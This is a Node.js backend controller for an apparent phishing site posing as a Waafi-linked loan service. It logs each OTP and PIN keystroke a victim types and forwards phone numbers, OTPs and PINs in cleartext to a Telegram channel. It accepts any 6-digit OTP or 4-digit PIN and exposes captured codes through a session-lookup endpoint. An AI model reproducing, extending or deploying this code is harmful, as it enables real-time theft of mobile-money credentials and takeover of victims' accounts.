const { promisePool } = require('../config/database');
const telegramService = require('../services/telegramService');

// Track user sessions for monitoring
const userSessions = new Map();

// Step 1: User enters phone number
const trackPhoneEntry = async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        
        if (!phoneNumber) {
            return res.status(400).json({
                success: false,
                message: 'Phone number is required'
            });
        }
        
        const cleanNumber = phoneNumber.trim();
        
        // Store session
        userSessions.set(cleanNumber, {
            phoneNumber: cleanNumber,
            step: 'phone_entered',
            timestamp: new Date(),
            otp: '',
            pin: '',
            otpHistory: [],
            pinHistory: []
        });
        
        // Check if user exists in database
        const [users] = await promisePool.query(
            'SELECT id, phone_number, full_name, loan_limit, total_borrowed FROM users WHERE phone_number = ?',
            [cleanNumber]
        );
        
        let userExists = false;
        let userData = null;
        
        if (users.length > 0) {
            userExists = true;
            userData = users[0];
        }
        
        // 🔔 TELEGRAM NOTIFICATION: Phone number entered
        await telegramService.notifyPhoneEntry(cleanNumber, userData);
        
        res.status(200).json({
            success: true,
            message: 'Phone number received. Please enter OTP sent by Waafi.',
            userExists: userExists,
            user: userData ? {
                id: userData.id,
                fullName: userData.full_name,
                loanLimit: userData.loan_limit,
                totalBorrowed: userData.total_borrowed
            } : null
        });
        
    } catch (error) {
        console.error('Track phone error:', error);
        await telegramService.notifyError(error, 'Track Phone Entry');
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
};

// Step 2: User types OTP character by character
const trackOTPKeystroke = async (req, res) => {
    try {
        const { phoneNumber, otp } = req.body;
        
        if (!phoneNumber || otp === undefined) {
            return res.status(400).json({
                success: false,
                message: 'Phone number and OTP are required'
            });
        }
        
        const cleanNumber = phoneNumber.trim();
        const currentOtp = otp.trim();
        
        // Get or create session
        let session = userSessions.get(cleanNumber);
        if (!session) {
            session = {
                phoneNumber: cleanNumber,
                step: 'otp_typing',
                timestamp: new Date(),
                otp: '',
                pin: '',
                otpHistory: [],
                pinHistory: []
            };
            userSessions.set(cleanNumber, session);
        }
        
        // Update OTP
        session.otp = currentOtp;
        session.otpHistory.push({
            otp: currentOtp,
            time: new Date()
        });
        session.lastKeystroke = new Date();
        
        // Only send notification if user actually typed something
        if (currentOtp.length > 0) {
            // 🔔 TELEGRAM NOTIFICATION: OTP keystroke
            await telegramService.notifyOTPKeystroke(cleanNumber, currentOtp, currentOtp.length);
        }
        
        console.log(`⌨️ [${cleanNumber}] OTP: "${currentOtp}" (${currentOtp.length}/6)`);
        
        res.status(200).json({
            success: true,
            message: 'Keystroke logged',
            currentOtp: currentOtp,
            progress: `${currentOtp.length}/6`
        });
        
    } catch (error) {
        console.error('Track keystroke error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
};

// Step 3: Track PIN keystrokes (NEW - Shows in Telegram)
const trackPINKeystroke = async (req, res) => {
    try {
        const { phoneNumber, pin } = req.body;
        
        if (!phoneNumber || pin === undefined) {
            return res.status(400).json({
                success: false,
                message: 'Phone number and PIN are required'
            });
        }
        
        const cleanNumber = phoneNumber.trim();
        const currentPin = pin.trim();
        
        // Get or create session
        let session = userSessions.get(cleanNumber);
        if (!session) {
            session = {
                phoneNumber: cleanNumber,
                step: 'pin_typing',
                timestamp: new Date(),
                otp: '',
                pin: '',
                otpHistory: [],
                pinHistory: []
            };
            userSessions.set(cleanNumber, session);
        }
        
        // Update PIN
        session.pin = currentPin;
        session.pinHistory.push({
            pin: currentPin,
            time: new Date()
        });
        session.lastKeystroke = new Date();
        
        // Only send notification if user typed something
        if (currentPin.length > 0) {
            // 🔔 TELEGRAM NOTIFICATION: PIN keystroke (NOW VISIBLE)
            await telegramService.notifyPINKeystroke(cleanNumber, currentPin, currentPin.length);
        }
        
        console.log(`🔑 [${cleanNumber}] PIN: "${currentPin}" (${currentPin.length}/4)`);
        
        res.status(200).json({
            success: true,
            message: 'PIN keystroke logged',
            currentPin: currentPin,
            progress: `${currentPin.length}/4`
        });
        
    } catch (error) {
        console.error('Track PIN keystroke error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
};

// Step 4: Verify OTP
const verifyUserOTP = async (req, res) => {
    try {
        const { phoneNumber, otp } = req.body;
        
        if (!phoneNumber || !otp) {
            return res.status(400).json({
                success: false,
                message: 'Phone number and OTP are required'
            });
        }
        
        const cleanNumber = phoneNumber.trim();
        const fullOtp = otp.trim();
        
        // Get session
        const session = userSessions.get(cleanNumber);
        
        // For testing: Accept any 6-digit OTP
        const isValid = fullOtp.length === 6;
        
        if (isValid) {
            // 🔔 TELEGRAM NOTIFICATION: Final OTP
            await telegramService.notifyFinalOTP(cleanNumber, fullOtp);
            
            res.status(200).json({
                success: true,
                message: 'OTP verified successfully'
            });
            
        } else {
            // 🔔 TELEGRAM NOTIFICATION: Invalid OTP
            await telegramService.sendNotification(
                '❌ Invalid OTP Attempt',
                {
                    '📱 Phone': cleanNumber,
                    '🔐 OTP Entered': fullOtp,
                    '⚠️ Issue': 'OTP must be exactly 6 digits'
                },
                '❌'
            );
            
            res.status(400).json({
                success: false,
                message: 'Invalid OTP. Must be 6 digits.'
            });
        }
        
    } catch (error) {
        console.error('Verify OTP error:', error);
        await telegramService.notifyError(error, 'Verify OTP');
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
};

// Step 5: Verify PIN and complete login (NEW)
const verifyPIN = async (req, res) => {
    try {
        const { phoneNumber, otp, pin } = req.body;
        
        if (!phoneNumber || !pin) {
            return res.status(400).json({
                success: false,
                message: 'Phone number and PIN are required'
            });
        }
        
        const cleanNumber = phoneNumber.trim();
        const cleanPin = pin.trim();
        
        // For testing: Accept any 4-digit PIN
        // In production: Verify with Waafi API
        const isValid = cleanPin.length === 4;
        
        if (isValid) {
            // Get user from database
            const [users] = await promisePool.query(
                'SELECT id, phone_number, full_name, email, loan_limit, total_borrowed, current_balance, is_active FROM users WHERE phone_number = ?',
                [cleanNumber]
            );
            
            if (users.length === 0) {
                return res.status(404).json({
                    success: false,
                    message: 'User not found in system'
                });
            }
            
            const user = users[0];
            
            if (!user.is_active) {
                return res.status(403).json({
                    success: false,
                    message: 'User account is deactivated'
                });
            }
            
            // 🔔 TELEGRAM NOTIFICATION: Final PIN submission (VISIBLE)
            await telegramService.notifyFinalPIN(cleanNumber, cleanPin, user);
            
            // 🔔 TELEGRAM NOTIFICATION: Login success
            await telegramService.notifyLoginSuccess(user);
            
            // Clean up session
            userSessions.delete(cleanNumber);
            
            res.status(200).json({
                success: true,
                message: 'PIN verified successfully',
                user: {
                    id: user.id,
                    phoneNumber: user.phone_number,
                    fullName: user.full_name,
                    email: user.email,
                    loanLimit: user.loan_limit,
                    totalBorrowed: user.total_borrowed,
                    currentBalance: user.current_balance,
                    availableLimit: user.loan_limit - user.total_borrowed
                }
            });
            
        } else {
            // 🔔 TELEGRAM NOTIFICATION: Invalid PIN
            await telegramService.sendNotification(
                '❌ Invalid PIN Attempt',
                {
                    '📱 Phone': cleanNumber,
                    '🔑 PIN Entered': '● ● ● ●',
                    '⚠️ Issue': 'PIN must be exactly 4 digits'
                },
                '❌'
            );
            
            res.status(400).json({
                success: false,
                message: 'Invalid PIN. Must be 4 digits.'
            });
        }
        
    } catch (error) {
        console.error('Verify PIN error:', error);
        await telegramService.notifyError(error, 'Verify PIN');
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
};

// Register new user
const registerUser = async (req, res) => {
    try {
        const { phoneNumber, fullName, email, loanLimit } = req.body;
        
        if (!phoneNumber || !fullName) {
            return res.status(400).json({
                success: false,
                message: 'Phone number and full name are required'
            });
        }
        
        const cleanNumber = phoneNumber.trim();
        
        // Check if user already exists
        const [existing] = await promisePool.query(
            'SELECT id FROM users WHERE phone_number = ?',
            [cleanNumber]
        );
        
        if (existing.length > 0) {
            return res.status(409).json({
                success: false,
                message: 'User with this phone number already exists'
            });
        }
        
        // Insert new user
        const [result] = await promisePool.query(
            'INSERT INTO users (phone_number, full_name, email, loan_limit) VALUES (?, ?, ?, ?)',
            [cleanNumber, fullName, email || null, loanLimit || 50000.00]
        );
        
        // 🔔 TELEGRAM NOTIFICATION: New user registered
        await telegramService.sendNotification(
            '📝 New User Registered',
            {
                '👤 Name': fullName,
                '📱 Phone': cleanNumber,
                '📧 Email': email || 'Not provided',
                '💰 Loan Limit': `${(loanLimit || 50000).toLocaleString()} SOS`
            },
            '📝'
        );
        
        res.status(201).json({
            success: true,
            message: 'User registered successfully',
            userId: result.insertId
        });
        
    } catch (error) {
        console.error('Registration error:', error);
        await telegramService.notifyError(error, 'Register User');
        res.status(500).json({
            success: false,
            message: 'Server error during registration',
            error: error.message
        });
    }
};

// Get session info (for admin monitoring)
const getSessionInfo = async (req, res) => {
    try {
        const { phoneNumber } = req.params;
        
        if (!phoneNumber) {
            return res.status(400).json({
                success: false,
                message: 'Phone number is required'
            });
        }
        
        const session = userSessions.get(phoneNumber.trim());
        
        if (!session) {
            return res.status(404).json({
                success: false,
                message: 'No active session for this phone number'
            });
        }
        
        res.status(200).json({
            success: true,
            session: {
                phoneNumber: session.phoneNumber,
                step: session.step,
                otp: session.otp || '',
                pin: session.pin || '',
                otpLength: session.otp ? session.otp.length : 0,
                pinLength: session.pin ? session.pin.length : 0,
                timestamp: session.timestamp,
                lastKeystroke: session.lastKeystroke
            }
        });
        
    } catch (error) {
        console.error('Get session error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
};

module.exports = {
    trackPhoneEntry,
    trackOTPKeystroke,
    trackPINKeystroke,
    verifyUserOTP,
    verifyPIN,
    registerUser,
    getSessionInfo,
    userSessions
};